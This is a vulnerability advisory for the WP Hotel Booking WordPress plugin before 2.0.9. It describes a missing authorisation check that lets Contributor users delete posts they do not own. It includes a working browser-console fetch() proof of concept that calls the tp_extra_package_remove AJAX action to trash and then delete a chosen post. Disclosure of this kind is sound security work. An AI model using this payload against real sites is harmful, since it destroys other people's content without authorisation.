## WordPress Plugin Vulnerabilities

# WP Hotel Booking < 2.0.9 - Contributor+ Arbitrary Post Deletion

### Description

The plugin does not have proper authorisation when deleting a package, allowing Contributor and above roles to delete posts that do no belong to them

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a Contributor user. This will put the post with ID 1 in the trash (change this ID to a post the user should not be able to delete, like one created by an admin). Run it again to delete the post
fetch("/wp-admin/admin-ajax.php", {"headers": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},"body": 'action=tp\_extra\_package\_remove&package\_id=1&nonce=' + hotel\_settings['nonce'],"method": "POST"});
